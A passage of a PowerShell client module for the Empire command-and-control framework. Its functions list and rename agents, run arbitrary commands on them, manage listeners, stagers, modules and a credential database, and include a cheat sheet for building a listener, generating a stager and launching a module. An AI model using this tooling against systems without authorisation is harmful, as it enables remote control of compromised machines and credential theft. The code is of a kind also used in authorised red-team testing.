            AgentView{$Reply += EmpireCall AgentView -Spec $Agt | select * -ExcludeProperty results}
            # Result
            AgentResult{
                $Re = EmpireCall AgentResult -Spec $Agt
                $Reply += New-Object PSCustomObject -Property @{
                    Name = $Re.AgentName
                    Results = $Re.AgentResults|convertfrom-Json
                    }}
            # Target
            AgentTarget{$Global:EmpireTarget.Agent = $Agt}
            # Other
            Default{$Reply += EmpireCall $PSCmdlet.ParameterSetName -Spec $Agt}
            }}
    ## Return Result
    End{$Script:DynP = $Null; Return $Reply}
    }
#end



#################################### Empire-Cred

<#
.Synopsis
   Empire Cred DB
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Cred
   Example Description
.EXAMPLE
   Empire-Cred
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Cred{
    [CmdletBinding(DefaultParameterSetname='CredList',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Cred')]
    Param(
		# List all Creds
		[Parameter(Mandatory=0,ParameterSetName='CredList')][switch]$List,
		# Add Creds to DB
		[Parameter(Mandatory=1,ParameterSetName='CredAdd')][switch]$Add,
		# UserName to Add
		[Parameter(Mandatory=1,ParameterSetName='CredAdd',Position=1)][Alias('Name','Usr')][String]$UserName,
        # Password to Add
		[Parameter(Mandatory=1,ParameterSetName='CredAdd',Position=0)][Alias('Pwd')][String]$Password
		)
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -in 'CredList'){
            return DynDico -Name ID -Type Int -Mandat 0 -Pipe 1 -Pos 0 -VSet (DynSession)
            }}
    ## Make It So
    Begin{}
    Process{
        # Session
        if($Script:DynP.IsSet){$Sess = $Script:DynP.Value}
        else{$Sess = $Global:EmpireTarget.ID}
        # Switch Action
        Switch($PSCmdlet.ParameterSetName){
            # List
            CredList{$Result = EmpireCall CredList -id $Sess}
            # Add
            CredAdd {$Result = EmpireCall CredAdd -Opt @{UserName=$UserName;Password=$Password}}
            }}
    ## Return Result
    End{$Script:DynP = $Null; Return $Result}
    }
#end



################################### Empire-Event

<#
.Synopsis
   Get empire Events
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Event
   Example Description
.EXAMPLE
   Empire-Event
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Event{
    [CmdletBinding(DefaultParameterSetname='EventView',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Event','Logs')]
    Param(
		# View all Events
		[Parameter(Mandatory=1,ParameterSetName='EventList')][switch]$List,
		# View Agent Event
		[Parameter(Mandatory=0,ParameterSetName='EventView')][switch]$View,
		# View Event Message
		[Parameter(Mandatory=1,ParameterSetName='EventMessage')][Alias('Msg')][Switch]$Message,
        [Parameter(Mandatory=1,ParameterSetName='EventMessage',Position=0,ValueFromRemainingArguments=1)][Alias('Key')][String]$Term,
		# View Event Type
		[Parameter(Mandatory=1,ParameterSetName='EventType')][switch]$Type
		)
    DynamicParam{
        # Filter ParamSet
        If($PSCmdlet.ParameterSetName -ne 'EventMessage'){
            # Populate Vars
            Switch($PSCmdlet.ParameterSetName){
                #SET        { NAME     ; TYPE       ; MAND ; PIPE ; POS  ; VSET
                #################################################################################...
                EventList   { $N='ID'  ; $T='Int'   ; $M=0 ; $L=0 ; $P=0 ; $V=DynSession                         }
                EventView   { $N='Name'; $T='String'; $M=0 ; $L=1 ; $P=0 ; $V=[Array]$Global:EmpireList.AgentName}
                EventType   { $N='Name'; $T='String'; $M=0 ; $L=0 ; $P=0 ; $V='checkin','task','result','rename'}
                }
        # Return Dico
        return DynDico -Name $N -Type $T -Mandat $M -Pipe $L -Pos $P -VSet $V
        }}
    ## Make It So
    Begin{$Result=@()}
    Process{
        # Switch Action
        Switch($PSCmdlet.ParameterSetName){
            # List All
            EventList{
                if($Script:DynP.IsSet){$Sess = $Script:DynP.Value}
                else{$Sess = $Global:EmpireTarget.ID}
                $result = EmpireCall EventList -ID $sess
                }
            # View Agent
            EventView{$result = EmpireCall EventList}
            # Vew Message
            EventMessage{
                $term = $Term.replace(' ','*')
                $result = EmpireCall EventMessage -Spec $term}
            # View Type
            EventType{$result = EmpireCall EventType -Spec $Script:DynP.Value}
            }}
    # Return Result
    End{$Script:DynP = $Null; Return $Result}
    }
#end



#################################### Empire-Exec

<#
.Synopsis
   Execute Commands
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Exec
   Example Description
.EXAMPLE
   Empire-Exec
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Exec{
    [CmdletBinding(DefaultParameterSetname='ExecCommand',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Exec','PoSh','X')]
    Param(
		# Execute Given Command
		[Parameter(Mandatory=1,ParameterSetName='ExecCommand',Position=0)][Alias('Cmd')][string]$Command,
		# No Reply
		[Parameter(Mandatory=0,ParameterSetName='ExecCommand')][Switch]$Json,
        # No Reply
		[Parameter(Mandatory=0,ParameterSetName='ExecCommand')][Alias('NoReply')][switch]$Blind,
		# No Reply
		[Parameter(Mandatory=0,ParameterSetName='ExecCommand')][Alias('Sec')][Int]$MaxWait=10
		)
    DynamicParam{
        return DynDico -Name Name -Type String -Mandat 0 -Pipe 1 -Pos 1 -VSet $Global:EmpireList.AgentName     
        }
    ## Make It So
    Begin{
        $Result = @()
        if($Json){$Command +="|ConvertTo-Json"}
        }
    Process{
        # Name Agent
        if($Script:DynP.IsSet){$Agt=$Script:DynP.Value}
        else{$Agt=$Global:EmpireTarget.Agent}
        # Task Agent
        $Reply = EmpireCall AgentExec -Spec $Agt -Opt @{command=$Command}
        if($Reply.success -AND -Not$Blind){
            # Get Task ID
            $Task = Empire-Event -View $Agt -Verbose:$False | ? event_type -eq Task
            $LastTask = $Task[$Task.count -1]
            Write-Verbose "$Agt - $($LastTask.message) [TaskID $($LastTask.TaskID)]"
            # MaxWait TaskID Result
            $Loop = 0
            Write-Verbose "$Agt - Waiting for results [max $Maxwait]"
            Do{ Sleep 1
                $LastRes = Empire-Event $agt -Verbose:$False | ? event_type -eq result |Sort ID -Descending | Select -first 1
                $Loop ++
            }Until($LastRes.TaskID -eq $LastTask.TaskID -OR $Loop -eq $MaxWait)
            # If too long...
            If($Loop -eq $MaxWait){Write-Warning "$Agt - Skipping Results: Too Slow...";Break}
            # Else result
            Else{
                $Re = (Empire-Result $Agt -Verbose:$False).results
                if($Json){$Re = $Re | Convertfrom-Json}
                $Result += $Re
                }}
        # If Blind or Error
        Else{$Result=$Null}
        }
    ## Return Result
    End{$Script:DynP = $Null; Return $Result}
    }
#end



################################ Empire-Listener

<#
.Synopsis
   Interact with Listeners
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Listener
   Example Description
.EXAMPLE
   Empire-Listener
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Listener{
    [CmdletBinding(DefaultParameterSetname='ListenerView',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Listener','Lst')]
    Param(
		# List all Listeners
		[Parameter(Mandatory=1,ParameterSetName='ListenerList')][switch]$List,
		# View specified Listener
		[Parameter(Mandatory=0,ParameterSetName='ListenerView')][switch]$View,
		# View Listener Options
		[Parameter(Mandatory=1,ParameterSetName='ListenerUse')][Alias('Load','Select')][switch]$Use,
		# View Listener Options
		[Parameter(Mandatory=1,ParameterSetName='ListenerOption')][switch]$Option,
        # New Listener
		[Parameter(Mandatory=1,ParameterSetName='ListenerNew')][Alias('New','X')][switch]$Execute,
		# Sync Listener List
		[Parameter(Mandatory=1,ParameterSetName='ListenerSync')][switch]$Sync,
		# Kill specified Listener
		[Parameter(Mandatory=1,ParameterSetName='ListenerKill')][switch]$Kill,
        # Listener type to use
        [Parameter(Mandatory=1,ParameterSetName='ListenerUse',Position=0)][ListenerType]$Type
		)
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -in 'ListenerView','ListenerKill','ListenerList'){
            # Populate Vars
            Switch($PSCmdlet.ParameterSetName){
                #SET        { NAME     ; TYPE       ; MAND ; PIPE ; POS  ; VSET
                ########################################################################...
                ListenerKill{ $N='Name'; $T='String'; $M=1 ; $L=0 ; $P=0 ; $V=$Global:EmpireList.ListenerName}
                ListenerView{ $N='Name'; $T='String'; $M=0 ; $L=0 ; $P=0 ; $V=$Global:EmpireList.ListenerName}
                ListenerList{ $N='ID'  ; $T='Int'   ; $M=0 ; $L=1 ; $P=0 ; $V=DynSession}
                }
            # Return Dico
            return DynDico -Name $N -Type $T -Mandat $M -Pipe $L -Pos $P -VSet $V
            }
        if($PSCmdlet.ParameterSetName -eq 'ListenerOption'){
            ## Prep Empty Dico
            $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
            ## Name
            # Create Attribute Obj
            $VSet = $Global:EmpireList.temp.Name
            $Attrb = New-Object Management.Automation.ParameterAttribute
            $Attrb.Mandatory=0
            $Attrb.Position=0
            # Create AttributeCollection
            $Cllct = New-Object Collections.ObjectModel.Collection[System.Attribute]
            # Add Attribute Obj to Collection
            $Cllct.Add($Attrb)
            # Create ValidateSet & add to collection     
            $VldSt=New-Object Management.Automation.ValidateSetAttribute($VSet)
            $Cllct.Add($VldSt)
            # Create Runtine DynParam
            $DynPar = New-Object Management.Automation.RuntimeDefinedParameter('Name',[String],$Cllct)
            # Add dynParam to Dictionary
            $Dico.Add('Name',$DynPar)      
            ## Value
            # Create Attribute Obj for Value
            $Attrb1 = New-Object Management.Automation.ParameterAttribute
            $Attrb1.Mandatory=0
            $Attrb1.Position=1
            # Create AttributeCollection
            $Cllct1 = New-Object Collections.ObjectModel.Collection[System.Attribute]
            # Add Attribute Obj to Collection
            $Cllct1.Add($Attrb1)
            # AllowEmptyString & add to collection     
            $EStr=New-Object Management.Automation.AllowEmptyStringAttribute
            $Cllct1.Add($EStr)
            # Create Runtine DynParam
            $DynVal = New-Object Management.Automation.RuntimeDefinedParameter('Value',[String],$Cllct1)
            # Add dynVal to Dictionary
            $Dico.Add('Value',$DynVal) 
            ## Return Dico
            Return $Dico
            }}
    ## Make It So
    Begin{$Result=@()}
    Process{
        # Switch Action
        Switch($PSCmdlet.ParameterSetName){
            ## Sync
            ListenerSync{Empire-Sync -Listener}
            ## List
            ListenerList{
                if($DynP.IsSet){$Sess = $DynP.Value}
                else{$Sess = $Global:EmpireTarget.ID}
                $Result = EmpireCall ListenerList -ID $Sess
                # Sync Obj
                $Global:EmpireList.ListenerName = $Result.Name
                }
            ## View
            ListenerView{
                if($Script:DynP.IsSet){
                    $result = EmpireCall ListenerView -Spec $Script:DynP.Value
                    }
                else{$Result=Empire-Listener -list}
                }
            ## Use 
            ListenerUse{
                $Result =  EmpireCall ListenerOptions -Spec $Type | UnpackOptions | Select Name,Description,Required,Value
                if($Use){
                    $Global:EmpireList.Temp = $Result
                    $Global:EmpireList.TempType = $Type
                    Return <#NoOut#>
                    }}
            ## Option
            ListenerOption{
                # View
                if(-Not$DynPar.IsSet -and -Not$DynVal.IsSet){$Result = $Global:EmpireList.Temp}
                # Set
                elseif($DynPar.IsSet -and $DynVal.IsSet){($Global:EmpireList.Temp|? Name -eq $DynPar.Value).Value = $DynVal.Value}
                # Warning
                else{Write-Warning "Must Specify Value"}
                }
            ## New
            ListenerNew{
                if(WarnMissing $Global:EmpireList.temp){Return}
                $Obj = New-Object PSCustomObject
                $Tmp = $Global:EmpireList.temp | ? Value | Select Name,Value
                $Tmp | %{$Obj | Add-Member NoteProperty -Name $_.Name -Value "$($_.Value)"}
                $result = EmpireCall ListenerNew -Spec $($Global:EmpireList.TempType -as [String]) -Opt $Obj
                }
            ## Kill
            ListenerKill{$Result = EmpireCall ListenerKill -Spec $Script:DynP.value}
            }}
    ## Return Result
    End{$Script:DynP = $Null; if(-Not$Use){Return $Result}}
    }
#end



#################################### Empire-Memo

<#
.Synopsis
   Empire Memo
.DESCRIPTION
   TLDR
.EXAMPLE
   Memo
.EXAMPLE
   Memo -Agent -Listener
.INPUTS
   None
.OUTPUTS
   Memo
.NOTES
   See full Help pages for more details
.FUNCTIONALITY
   TLDR
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Memo{
    [CmdletBinding()]
    [Alias('Memo','Cheat','tldr')]
    Param(
        [Parameter()][Switch]$Admin,
        [Parameter()][Switch]$Agent,
        [Parameter()][Switch]$Cred,
        [Parameter()][Switch]$Event,
        [Parameter()][Switch]$Exec,
        [Parameter()][Switch]$Listener,
        [Parameter()][Switch]$Module,
        [Parameter()][Switch]$Option,
        [Parameter()][Switch]$Result,
        [Parameter()][Switch]$Search,
        [Parameter()][Switch]$Session,
        [Parameter()][Switch]$Speak,
        [Parameter()][Switch]$Stager,
        [Parameter()][Switch]$Strike,
        [Parameter()][Switch]$Sync,
        [Parameter()][Switch]$Target,
        [Parameter()][Switch]$Tune,
        [Parameter()][Switch]$Use,
        [Parameter()][Switch]$View
        )
    ## Make It So
    Begin{  
        # Empty Collector
        $Reply=@("
 SYNTAX                              DESCRIPTION
------------------------------------------------------------")
        # Admin
        $AdminTXT += @(" Admin -Login <Srv> <Usr> [-NoSSL]   New Empire Session
 Admin [-Config]                     View Session Info
 Admin -Token                        View Session Token
 Admin -Restart -X                   Restart Empire
 Admin -ShutDown -X                  Shutdown Empire
 Admin -Version                      Get Empire Version
 Admin -File <??>                    ??
 Admin -Map                          Map Empire API
 Admin -?                            More Help
------------------------------------------------------------")
        # Agent
        $AgentTXT += @(" Agent -List                         List All Agents
 Agent  <TAB> [-Target]              View/Target Agent
 Agent [<TAB>] -Exec <Command>       Exec PoSh Command
 Agent [<TAB>] -Result               Get Agent Result
 Agent [<TAB>] -DeleteResult         Delete Agent Results
 Agent [<TAB>] -ClearBuffer          Clear Agent Task Buffer
 Agent [<TAB>] -Kill -X              Kill Agent
 Agent [<TAB>] -Remove -X            Remove Agent
 Agent [<TAB>] -NewName <NewName>    Rename Agent
 Agent [<TAB>] -UploadFile <Path>    Upload File
 Agent -ListStale  [<ID>]            List All Stale
 Agent -RemoveStale [<ID>]           Remove All Stale
 Agent -Sync                         Sync Agent List
 Agent -?                            More Help
------------------------------------------------------------")
        # Cred
        $CredTXT += @(" Cred                                View Cred DB
 Cred -Add <Usr> <Pwd>               Add To Cred DB
 Cred -?                             More Help
------------------------------------------------------------")
        # Event
        $EventTXT += @(" Event -List                         List All Events
 Event <TAB>                         List Agent Events
 Event -Message <Term>               Search Event
 Event -Type <TAB>                   View Event Type
 Event -?                            More Help
------------------------------------------------------------")
        # Exec
        $ExecTXT += @(" Exec <Command> [-Blind]             Execute PoSh Commands
 Exec -?                             More Help
------------------------------------------------------------")
        # Listener
        $ListenerTXT += @(" Listener -List                      List All Listeners
 Listener -View <TAB>                View Listener by Name
 Listener <TAB> -Use                 View/Use Listener Type
 Listener -Option [<TAB> <Value>]    View/Set Listener Option
 Listener -Execute                   Execute Listener
 Listener -Kill <TAB> -X             Kill Listener
 Listener -Sync                      Sync Listener List
 Listener -?                         More help
------------------------------------------------------------ ")
        # Module
        $ModuleTXT += @(" Modul -List [-Cat] [-Lang]          List Modules
 Modul <TAB> <TAB> <TAB> [-Target]   View/Target Module
 Modul -Exec -X [-Blind]             Exec Module
 Modul -Sync                         Sync Module list
 Modul -?                            More Help
------------------------------------------------------------")
        # Option
        $OptionTXT += @(" Option <TAB> <Value>                View/Set Module Option
 Option -?                           More help
------------------------------------------------------------")
        # Result
        $ResultTXT += @(" Result [<TAB>]                      View Agent Results
 Result -?                           More help
------------------------------------------------------------")
        # Search
        $SearchTXT += @(" Search <Term [Term]> [-Target]      Search Module
 Search -?                           More Help
------------------------------------------------------------")
        # Session
        $SessionTXT += @(" Session -List                       List All Sessions
 Session <TAB> [-Target]             Target Session
 Session -New <Srv> <Usr> [-NoSSL]   New Session
 Session -Sync                       Sync All in Session
 Session -?                          More help  
------------------------------------------------------------")
        # Speak
        $SpeakTXT += @(" Speak <string>                      Say Stuff
 Speak -?                            More Help
------------------------------------------------------------")
        # Stager
        $StagerTXT += @(" Stager -List                        List All Stagers
 Stager <TAB> [-Use]                 Use Stager Type
 Stager -Option [<TAB> <Value>]      Set Stager Options
 Stager -Generate                    Generate Stager
 Stager -Sync                        Sync Stager type list
 Stager -?                           More Help
------------------------------------------------------------")
        # Strike
        $StrikeTXT += @(" Strike [-X [-Blind]]                View/Exec Strike
 Strike -?                           More Help
------------------------------------------------------------")
        # Sync
        $SyncTXT += @(" Sync [-Session]                     Sync All in Session
 Sync -Module                        Sync Module List
 Sync -Agent                         Sync Agent List
 Sync -Listener                      Sync Listener List
 Sync -Stager                        Sync Stager type List
 Sync -?                             More Help
------------------------------------------------------------")
        # Target
        $TargetTXT += @(" Target [-Agent] <TAB>               Set Target Agent    
 Target -Session <TAB>               Set Target Session
 Target -Module <TAB>                Set Target Module
 Target -View                        View Target
 Target -?                           More Help
------------------------------------------------------------")
        # Tune
        $TuneTXT += @(" Tune [<TAB>]                          Imperial March
------------------------------------------------------------")
        # Use
        $UseTXT += @(" Use -Stager <TAB>                   Use Stager type
 Use -Listener <TAB>                 Use Listener Name
 Use [-Module] <TAB>                 Use Module Name
 Use -?                              More Help
------------------------------------------------------------")
        # View
        $ViewTXT += @(" View -Target                        View Target
 View -Session <TAB>                 View Session by ID
 View -Module <TAB>                  View Module by Name
 View -Agent <TAB>                   View Agent by Name
 View -Listerner <TAB>               View Listener by Name
 View -Stager <TAB>                  View Stager Type
 View -Strike                        View Strike Obj
 View -Banner                        View Banner
 View -?                             More help
------------------------------------------------------------")
        # Listener Extra
        $ListenerTXT2 += @("
 ## Creating a Listener
 Listener http -Use
 Listener -Option Name E1_http
 Listener -Execute")
        # Stager Extra
        $StagerTXT2 += @(" 
 ## Generating a Stager
 Stager -Use Multi/Launcher
 Stager -Option X Y
 Stager -Generate -Type Multi/Launcher -Listener http")
        # Module Extra
        $ModuleTXT2 += @("
 ## Using a module
 Modul  PowerShell Trollsploit message -Target
 Option MsgText 'Hello World'
 Strike [-Blind] -X")
        }
    Process{
        # Build Table
        Foreach($K in $PSBoundParameters.keys){
            $Reply += Get-Variable -Name "${K}TXT" -ValueOnly
            }
        # or Default table
        if($PSBoundParameters.keys.count -eq 0){
            $Reply += ($AdminTXT+$ListenerTXT+$StagerTXT+$AgentTXT+$ExecTXT+$ModuleTXT+$OptionTXT+$StrikeTXT+$ResultTXT+$ListenerTXT2+$StagerTXT2+$ModuleTXT2)
            }
        # Add Extra 
        if($Listener){$Reply += $ListenerTXT2}
        if($Stager){$Reply += $StagerTXT2}
        if($Module -OR $Strike){$Reply += $ModuleTXT2}  
        $Reply += @("`n")
        }
    ## Return Reply
    End{Return $Reply}
    }
#end



################################## Empire-Module

<#
.Synopsis
   Interact with Modules
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Module
   Example Description
.EXAMPLE
   Empire-Module
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Module{
    [CmdletBinding(DefaultParameterSetname='ModuleView',HelpUri='https://github.com/EmpireProject/Empire/wiki'<#,Positionalbinding=0#>)]
    [Alias('Modul','Mod')]
    Param(
		# List all Modules
		[Parameter(Mandatory=1,ParameterSetName='ModuleList')][switch]$List,
		# View Module
		[Parameter(Mandatory=0,ParameterSetName='ModuleView')][switch]$View,
		# Sync Module Object
		[Parameter(Mandatory=1,ParameterSetName='ModuleSync')][switch]$Sync,
		# Module Language
        [ValidateSet('PowerShell','Python')]
        [Parameter(Mandatory=0,ParameterSetName='ModuleList',Position=0)]
        [Parameter(Mandatory=1,ParameterSetName='ModuleView',Position=0)][Alias('Language')][string]$Lang,
		# Module Category
        [Parameter(Mandatory=0,ParameterSetName='ModuleList',Position=1)]
        [Parameter(Mandatory=1,ParameterSetName='ModuleView',Position=1)][Alias('Category')][ModuleCategory]$Cat,
        # Set Target Module
        [Parameter(Mandatory=0,ParameterSetName='ModuleView')]
		[Parameter(Mandatory=1,ParameterSetName='ModuleTarget')][Alias('Tgt','Load','X','Use','Select')][switch]$Target
        )
    # Dyn
    DynamicParam{
        # Filter ParamSet View
        if($PSCmdlet.ParameterSetName -eq 'ModuleView'){
            # Return Dico
            return DynDico -Name Name -Type String -Mandat 1 -Pipe 0 -Pos 2 -VSet (MFilter -Lang $lang -Cat $Cat.ToString())
            }
        # Filter ParamSet Target      
        if($PSCmdlet.ParameterSetName -eq 'ModuleTarget'){
            return DynDico -Name Name -Type String -Mandat 1 -Pipe 1 -Pos 1 -VSet ([Array]$Global:EmpireList.ModuleName)
            }}
    ## Make It So
    Begin{}
    Process{
        # Switch Action
        Switch($PSCmdlet.ParameterSetName){
            ## Search
            ModuleSearch{
                $Term = $term.replace(' ','*')
                $All = $Global:EmpireList.Module
                if($Author){$Result = $All | ?{$_.Author -like "*$term*"}}
                elseIf($Description){$Result = $All | ?{$_.Description -like "*$term*"}}
                elseIf($Comment){$Result = $All | ?{$_.Comments -like "*$term*"}}
                Else{$Result = $All | ?{$_.Name -like "*$term*"}}
                }
            ## List
            ModuleList{
                $Result = $EmpireList.Module
                if($Lang){$Result = $Result | ? Language -eq $Lang}
                if($Cat){$Result = $Result | ? {$_.Name -match $Cat.toString().tolower()}}
                }
            ## View
            ModuleView{ 
                $FullName = ''+$Lang.ToLower()+'/'+$Cat.toString().ToLower()+'/'+$Script:DynP.Value
                if($Target){
                    $Global:EmpireStrike.Module = $FullName
                    $Global:EmpireStrike.Option = $Global:EmpireList.Module|? Name -eq $FullName | UnpackOptions}
                else{$Result = $Global:EmpireList.Module | ? {$_.Name -eq $FullName}}
                }
            ## Sync
            ModuleSync{Empire-Sync -Module}
            ## Target
            ModuleTarget{
                $Global:EmpireStrike.Module = $Script:DynP.Value
                $Global:EmpireStrike.Option = $Global:EmpireList.Module|? Name -eq $Script:DynP.Value | UnpackOptions
                }}}
    ## Return Result
    End{$Script:DynP = $Null; Return $Result}
    }
#end




################################## Empire-Option

<#
.Synopsis
   Strike Module Option
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Option
   Example Description
.EXAMPLE
   Empire-Option
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Option{
    [CmdletBinding(HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Option','Opt','Set')]
    Param()
    DynamicParam{
        ## Prep Empty Dico
        $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        ## Name
        # Create Attribute Obj
        $VSet = $Global:EmpireStrike.Option.name
        $Attrb = New-Object Management.Automation.ParameterAttribute
        $Attrb.Mandatory=0
        $Attrb.Position=0
        # Create AttributeCollection
        $Cllct = New-Object Collections.ObjectModel.Collection[System.Attribute]
        # Add Attribute Obj to Collection
        $Cllct.Add($Attrb)
        # Create ValidateSet & add to collection     
        $VldSt=New-Object Management.Automation.ValidateSetAttribute($VSet)
        $Cllct.Add($VldSt)
        # Create Runtine DynParam
        $DynPar = New-Object Management.Automation.RuntimeDefinedParameter('Name',[String],$Cllct)
        # Add dynParam to Dictionary
        $Dico.Add('Name',$DynPar)      
        ## Value
        # Create Attribute Obj for Value
        $Attrb1 = New-Object Management.Automation.ParameterAttribute
        $Attrb1.Mandatory=0
        $Attrb1.Position=1
        # Create AttributeCollection
        $Cllct1 = New-Object Collections.ObjectModel.Collection[System.Attribute]
        # Add Attribute Obj to Collection
        $Cllct1.Add($Attrb1)
        # AllowEmptyString & add to collection     
        $EStr=New-Object Management.Automation.AllowEmptyStringAttribute
        $Cllct1.Add($EStr)
        # Create Runtine DynParam
        $DynVal = New-Object Management.Automation.RuntimeDefinedParameter('Value',[String],$Cllct1)
        # Add dynVal to Dictionary
        $Dico.Add('Value',$DynVal) 
        ## Return Dico
        Return $Dico
        }
    ## Make It So
    Begin{}
    Process{
        # View
        if(-Not$DynPar.IsSet -AND -Not$DynVal.IsSet){$Result = $Global:EmpireStrike.Option}
        # Warning
        if($DynPar.IsSet -AND -Not$DynVal.IsSet){Write-Warning "Specify Option Value"}
        # Set
        if($DynPar.IsSet -AND $DynVal.IsSet){
            ($Global:EmpireStrike.Option|? Name -eq $DynPar.Value).Value = $DynVal.Value
            }}
    ## Return Result
    End{Return $Result}
    }
#end



################################## Empire-Result

<#
.Synopsis
   Empire Result
.DESCRIPTION
   Get Agent Last
.EXAMPLE
   Result
#>
function Empire-Result{
    [CmdletBinding()]
    [Alias('Result')]
    Param([Parameter()][Alias('All')][Switch]$List)
    DynamicParam{Return DynDico -N Name -Type String -Mandat 0 -Pipe 1 -Pos 0 -VSet $Global:EmpireList.AgentName}
    ## Make It So
    Begin{$Result=@()}
    Process{
        if($Script:DynP.IsSet){$Agt = $Script:DynP.Value}
        else{$Agt = $Global:EmpireTarget.Agent}
        $Res = (EmpireCall AgentResult -Spec $Agt).AgentResults
        $OldRes = $res
        try{$res = $Res | ConvertFrom-Json -ErrorAction SilentlyContinue}catch{$res = $OldRes}
        if($Res -AND -Not$List){$Res = ($Res[$Res.count -1])}
        $Result += $res
        }
    ## Return Result
    End{$Script:DynP = $Null; if($Result){Return $Result}}
    }
#end



################################## Empire-Search

<#
.Synopsis
   Quick Search Module
.DESCRIPTION
   Shortcut for "Module -Search"
   > Returns Name Only
.EXAMPLE
   Search hw
#>
function Empire-Search{
    [CmdletBinding(HelpUri='https://github.com/EmpireProject/Empire/wiki',DefaultParameterSetName='SearchName')]
    [Alias('Search','Src')]
    Param(
        # Module Name (No Quotes)
        [Parameter(Mandatory=1,ValueFromRemainingArguments=1,Position=0)][String]$Term,
        # Field to Search
        [Parameter(Mandatory=1,ParameterSetName='SearchDesc')][Switch]$Description,
        [Parameter(Mandatory=1,ParameterSetName='SearchAuth')][Switch]$Author,
        [Parameter(Mandatory=1,ParameterSetName='SearchComm')][Switch]$Comment,
        [Parameter(Mandatory=0,ParameterSetName='SearchName')][Switch]$Name,
        # Set as Target
        [Parameter(Mandatory=0)][Alias('Tgt','Load','x','Use','Select')][Switch]$Target
        )
    # WildCard
    $Wild = "*$($Term.replace(' ','*'))*"
    # Switch Field
    Switch($PSCmdlet.ParameterSetName){
        SearchDesc {$Result = $Global:EmpireList.Module| ? Description -like $Wild}
        SearchAuth {$Result = $Global:EmpireList.Module| ? Author -like $Wild}
        SearchComm {$Result = $Global:EmpireList.Module| ? Comments -like $Wild}
        SearchName {$Result = $Global:EmpireList.Module| ? Name -like $Wild}
        }
    # If target
    if($Target){
        # Switch Result Count
        Switch($Result.name.Count){
        # No Match
        0 {Write-Warning "No Matching Module - Can't Target."}
        # Single Match
        1 { $Global:EmpireStrike.Module = $Result.name
        <##>$Global:EmpireStrike.Option = $Global:EmpireList.Module|? Name -eq $Result.name | UnpackOptions| ? name -ne Agent}
        # Multiple Match
        Default{Write-Warning "Multiple Matching Modules - Can't Target."}
        }}
    ## Return Result
    if(-Not$Target){return $Result}
    }
#end



################################# Empire-Session

<#
.Synopsis
   Interact with Session
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Session
   Example Description
.EXAMPLE
   Empire-Session
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Session{
    [CmdletBinding(DefaultParameterSetname='SessionView',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Session','Ses')]
    Param(
		# View Session
		[Parameter(Mandatory=0,ParameterSetName='SessionView')][switch]$View,
		# Sync Session Vars
		[Parameter(Mandatory=1,ParameterSetName='SessionSync')][switch]$Sync,
		# List Sessions
		[Parameter(Mandatory=1,ParameterSetName='SessionList')][switch]$List,
		# Target Session
		[Parameter(Mandatory=1,ParameterSetName='SessionTarget')][Alias('Tgt','Select')][switch]$Target,
		# Connect New Session
		[Parameter(Mandatory=0,ParameterSetName='SessionNew')][switch]$New,
		# Server IP
		[Parameter(Mandatory=1,ParameterSetName='SessionNew')][Alias('Srv','Host')][string]$Server,
		# UserName
		[Parameter(Mandatory=1,ParameterSetName='SessionNew')][Alias('Usr','Name')][string]$User,
		# Server Port
		[Parameter(Mandatory=0,ParameterSetName='SessionNew')][int]$Port,
		# No SSL Check
		[Parameter(Mandatory=0,ParameterSetName='SessionNew')][switch]$NoSSL,
        # Remove Session
        [Parameter(Mandatory=1,ParameterSetName='SessionRemove')][switch]$Remove,
        [Parameter(Mandatory=0,ParameterSetName='SessionRemove')][switch]$Fix
        )
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -in 'SessionTarget','SessionView','SessionRemove'){
            # Return Dico
            return DynDico -Name 'ID' -Type 'Int' -Mandat 0 -Pipe 1 -Pos 0 -VSet (DynSession)    
            }}
    ## Make It So
    Begin{$Result=@()}
    Process{
        if($PSCmdlet.ParameterSetName -in 'SessionTarget','SessionView'){
            if($Script:DynP.IsSet){$Sess = $Script:DynP.Value}
            else{$Sess = $Global:EmpireTarget.ID}        
            }
        # Switch Action
        Switch($PSCmdlet.ParameterSetName){
            ## View
            SessionView{$Global:EmpireSession | ? ID -eq $Sess}
            ## Sync
            SessionSync{Sync -Session}
            ## List
            SessionList{$Global:EmpireSession}
            # Target
